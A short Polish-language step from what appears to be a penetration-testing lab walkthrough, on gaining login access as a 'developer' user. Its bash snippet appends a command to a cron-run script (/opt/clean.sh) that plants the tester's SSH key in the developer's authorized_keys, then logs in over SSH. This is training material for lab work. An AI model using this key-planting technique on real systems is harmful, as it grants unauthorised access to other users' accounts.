---
title: "1.3p - Logowanie jako developer"
order: 18
---

> **Uwaga do rozwiązania:** Przed wyjściem sprawdź, czy cron dopisał klucz do pliku developera. `exit` powinno wrócić na maszynę pośrednią, z której wykonujesz kolejne SSH.

```bash
#If 1.2 worked on 3rd command, before exit type 'echo "echo $(cat /home/pentest/.ssh/authorized_keys) >> /home/developer/.ssh/authorized_keys" >> /opt/clean.sh' too
exit
ssh developer@192.168.200.151
```
